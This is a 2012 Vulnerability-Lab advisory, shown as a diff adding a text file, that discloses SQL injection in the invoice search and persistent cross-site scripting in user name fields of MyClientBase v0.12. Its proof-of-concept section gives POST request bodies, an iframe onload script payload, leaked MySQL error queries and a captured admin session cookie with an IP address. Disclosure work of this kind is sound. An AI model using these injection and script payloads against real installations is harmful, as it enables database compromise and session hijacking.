@@ -1,0 +1,293 @@
+Title:
+======
+MyClientBase v0.12 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-04-30
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=511
+
+
+VL-ID:
+=====
+511
+
+
+Introduction:
+=============
+MyClientBase is a simple, intuitive, free and open source web based invoice management 
+system developed with freelancers in mind. MCB is and always will be a community driven 
+project which aims to provide freelancers with a simple and intuitive invoice management 
+system. Please consider contributing your ideas, suggestions, comments, etc! MyClientBase 
+is designed to manage your clients and invoices as simply as possible. Every feature 
+included is aimed to benefit every user - not just one or two. Many of the features you`ll 
+find in MyClientBase were suggested by the community. Those suggestions that benefit the 
+community as a whole are what makes MyClientBase the successful project that it is.
+
+- Community driven
+- Completely web-based
+- Unlimited everything
+- Configurable taxes
+- Multi-language support
+- Editable invoice templates
+- Client access through Client Center
+- Collect payments online
+- Inventory tracking
+
+(Copy of the Vendor Homepage: http://myclientbase.com/ )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in MyClientBase v0.12 application.
+
+
+Report-Timeline:
+================
+2012-04-30:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+1.1
+Multiple remote SQL Injection vulnerabilities are detected in the MyClientBase Content Management System v0.12. 
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands 
+on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application 
+compromise. The vulnerability is located on invoice & tag when processing to request the invoice search module function 
+of the content management system. The technqiue behind is a easy order by injection mdb
+
+
+Vulnerable Module(s):
+					[+] Invoice Search - invoice# & tags
+
+
+--- SQL Exception Logs ---
+
+A Database Error Occurred
+Error Number: 1054
+
+Unknown column `1` in `where clause`
+
+SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username, 
+mcb_users.company_name AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name 
+AS from_first_name, mcb_users.address AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city 
+AS from_city, mcb_users.state AS from_state, mcb_users.zip AS from_zip, mcb_users.country AS from_country, 
+mcb_users.phone_number AS from_phone_number, mcb_users.email_address AS from_email_address, mcb_users.
+web_address AS from_web_address, mcb_invoice_statuses.*, IF(mcb_invoice_statuses.invoice_status_type <> 
+3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS invoice_is_overdue, (DATEDIFF(FROM_UNIXTIME
+(UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS invoice_days_overdue, mcb_users.tax_id_number 
+AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses ON mcb_invoice_statuses.invoice_status_id 
+= mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id = mcb_invoices.user_id JOIN 
+mcb_invoice_amounts ON mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients ON mcb_clients.
+client_id = mcb_invoices.client_id WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.`invoice_id` 
+IN (SELECT invoice_id FROM mcb_invoice_tags WHERE tag_id IN (SELECT tag_id FROM mcb_tags WHERE tag IN(`-1`))) AND
+ `1` = `mcb_invoices.invoice_number LIKE  `%-1 `% `` AND mcb_invoices.client_id IN (`2`) ORDER BY mcb_invoices.
+invoice_date_entered DESC, mcb_invoices.invoice_id DESC LIMIT 15
+
+Filename: 	/home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php
+Line Number: 	92
+
+---
+
+A Database Error Occurred
+Error Number: 1064
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 
+syntax to use near `%` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_enter` at line 9
+
+SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username, mcb_users.
+company_name AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name AS from_first_name, 
+mcb_users.address AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city AS from_city, mcb_users.state 
+AS from_state, mcb_users.zip AS from_zip, mcb_users.country AS from_country, mcb_users.phone_number AS from_phone_number, 
+mcb_users.email_address AS from_email_address, mcb_users.web_address AS from_web_address, mcb_invoice_statuses.*, 
+IF(mcb_invoice_statuses.invoice_status_type <> 3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS 
+invoice_is_overdue, (DATEDIFF(FROM_UNIXTIME(UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS 
+invoice_days_overdue, mcb_users.tax_id_number AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses 
+ON mcb_invoice_statuses.invoice_status_id = mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id = 
+mcb_invoices.user_id JOIN mcb_invoice_amounts ON mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients 
+ON mcb_clients.client_id = mcb_invoices.client_id WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.`
+invoice_number` LIKE `%-1`%` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_entered DESC, 
+mcb_invoices.invoice_id DESC LIMIT 15
+
+Filename: /home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php
+
+Line Number: 92
+--
+A Database Error Occurred
+Error Number: 1054
+Unknown column `137` in `where clause`
+
+SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username, mcb_users.company_name 
+AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name AS from_first_name, mcb_users.address 
+AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city AS from_city, mcb_users.state AS from_state, 
+mcb_users.zip AS from_zip, mcb_users.country AS from_country, mcb_users.phone_number AS from_phone_number, mcb_users.
+email_address AS from_email_address, mcb_users.web_address AS from_web_address, mcb_invoice_statuses.*, IF(mcb_invoice_statuses.
+invoice_status_type <> 3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS invoice_is_overdue, (DATEDIFF
+(FROM_UNIXTIME(UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS invoice_days_overdue, mcb_users.tax_id_number 
+AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses ON mcb_invoice_statuses.invoice_status_id = 
+mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id = mcb_invoices.user_id JOIN mcb_invoice_amounts ON 
+mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients ON mcb_clients.client_id = mcb_invoices.client_id 
+WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.`invoice_id` IN (SELECT invoice_id FROM mcb_invoice_tags WHERE 
+tag_id IN (SELECT tag_id FROM mcb_tags WHERE tag IN(`-1`))) AND `1` = `mcb_invoices.invoice_number LIKE  `%g% `` AND `
+mcb_invoice_amounts`.`invoice_total` = `2` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_entered 
+DESC, mcb_invoices.invoice_id DESC LIMIT 15
+
+Filename: /home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php
+Line Number: 92
+
+
+Pictures(s):
+					../1.png
+					../2.png
+					../3.png
+
+
+1.2
+Multiple persistent input validation vulnerabilities are detected in the MyClientBase Content Management System v0.12. 
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent). 
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
+context manipulation. Exploitation requires low user inter action. The vulnerability is located on the username 
+input fields first- or lastname & affects the user account listing on the admin section.
+
+                                       
+Vulnerable Module(s):
+					[+] User accounts - Add first & lastname - index.php/users/form/user_id/2
+					   [-] User Account Listing - first & lastname - myclientbase/index.php/users
+
+Pictures(s):
+					../4.png
+					../5.png
+
+
+Proof of Concept:
+=================
+1.1
+The sql injection vulnerabilities can be exploited by remote attackers without user inter action. For demonstration or reproduce ...
+
+URL: 		http://xxx.com/myclientbase/index.php/invoice_search
+METHOD:		POST
+INJECTION TYPE:	Order by --
+MODULE:		invoice# via invoice_number & tags
+
+Review: Vulnerable Input File
+<dl>
+<dt><label>Invoice #: </label></dt>
+<dd><input name="invoice_number" value="" type="text"></dd>
+</dl>
+... &
+<dl>
+<dt><label>Tags: </label></dt>
+<dd><input id="tags" name="tags" value="" type="text"></dd>
+</dl>
+
+PoC:
+POSTDATA=
+invoice_number=-1%27[SQL-Injection]&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=buh&output_type=index&btn_search=Search
+
+... or
+invoice_number=test&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=-1%27[SQL-Injection]&output_type=index&btn_search=Search
+
+
+ci_session=a%3A11%3A%7Bs%3A10%3A%22
+session_id%22%3Bs%3A32%3A%2248cebf507f1d7cbc8dd09fc127f16acb%22%3Bs%3A10%3A%22
+ip_address%22%3Bs%3A11%3A%2286.32.63.91%22%3Bs%3A10%3A%22
+user_agent%22%3Bs%3A50%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%3B+rv%3A11.0%29+Gecko%22%3Bs%3A13%3A%22
+last_activity%22%3Bi%3A1334351916%3Bs%3A7%3A%22
+user_id%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22
+last_name%22%3Bs%3A4%3A%22User%22%3Bs%3A10%3A%22
+first_name%22%3Bs%3A5%3A%22Admin%22%3Bs%3A12%3A%22
+global_admin%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22
+is_admin%22%3Bb%3A1%3Bs%3A10%3A%22
+last_index%22%3Bs%3A80%3A%22
+invoice_search%2Fsearch_results%2F
+index%2F
+search_hash%2F8389e50abcfbd64f85d756ed6ab0205e%22%3Bs%3A11%3A%22
+search_hash%22%3Ba%3A1%3A%7Bs%3A32%3A%228389e50abcfbd64f85d756ed6ab0205e%22%3Ba%3A2%3A%7Bs%3A5%3A%
+22where%22%3Ba%3A3%3A%7Bs%3A29%3A%22mcb_invoices.invoice_is_quote%22%3Bi%3A0%3Bi%3A0%3Bs%3A133%3A%22mcb_invoices.
+invoice_id+IN+%28SELECT+invoice_id+FROM+mcb_invoice_tags+WHERE+tag_id+IN+%28SELECT+tag_id+FROM+mcb_tags+WHERE+
+tag+IN%28%27-1%27%29%29%29%22%3Bi%3A1%3Bs%3A40%3A%22mcb_invoices.invoice_number+LIKE+%27%25-1%27%25%27%22%3B%7Ds
+%3A8%3A%22where_in%22%3Ba%3A1%3A%7Bs%3A22%3A%22mcb_invoices.client_id%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3B%
+7D%7D%7D%7D%7D4b78e5e505d94a46962e42792c6df0b8
+
+
+1.2
+The persistent input validation vulnerabilities can be exploited by remote attackers with low required user inter action.
+For demonstration or reproduce ...
+
+Input URL: 	http://xxx.com/myclientbase/index.php/users/form/user_id/2
+Affected URL: 	http://xxx.com/myclientbase/index.php/users
+
+Review: user Accounts - Listing
+
+<table>
+<tbody><tr>
+		<th scope="col" class="first">ID</th>
+		<th scope="col">Name</th>
+		<th scope="col">Company Name</th>
+		<th scope="col">Email</th>
+		<th scope="col">Phone Number</th>
+		<th scope="col" class="last">Actions</th>
+		</tr>
+			<tr>
+<td class="first">2</td>
+<td>"><iframe src="a" onload='alert("VulnerabilityLab")' <,="" "=""><
+iframe src=a onload=alert("VulnerabilityLab") <</td>
+					<td></td>
+
+
+Risk:
+=====
+1.1
+The security risk of the remote sql injection vulnerabilities are estimated as critical.
+
+1.2
+The security risk of the persistent input validation vulnerability is estimated as medium(+).
+
+
+Credits:
+========
+Vulnerability Research Laboratory  Team  -    Benjamin Kunz Mejri (Rem0ve)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
+
+
